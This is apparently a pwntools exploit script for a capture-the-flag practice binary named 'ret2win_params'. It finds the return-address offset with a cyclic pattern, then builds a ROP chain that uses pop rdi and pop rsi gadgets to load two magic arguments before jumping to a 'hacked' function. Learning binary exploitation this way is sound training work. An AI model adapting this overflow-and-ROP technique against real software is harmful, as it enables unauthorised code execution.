from pwn import *

def find_rip(payload):
    p = process(exe)
    p.recvline()
    p.sendline(payload)
    p.wait()                    # wait process to crash
    rip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info('located RIP offset at {a}'.format(a=rip_offset))

exe = './ret2win_params'
elf = context.binary = ELF(exe) # will exec checksec
context.log_level = 'debug'     # a lot of debug info

#offset = find_rip(cyclic(100))
offset = 24

p = process(exe)                # start program
p.recvline()

payload = b'A'*offset
payload += p64(0x40124b)            # POP RDI;          $ ropper --file ret2win_params --search "pop rdi"
payload += p64(0xdeadbeefdeadbeef)  # first param
payload += p64(0x401249)            # POP RSI; POP R15; $ ropper --file ret2win_params --search "pop rsi; pop r15"
payload += p64(0xc0debabec0debabe)  # seconde param
payload += p64(0x0)
payload += p64(elf.sym.hacked)      # address of hacked function


write('payload', payload)
p.sendline(payload)
p.recvline()
p.recvline()
p.close()

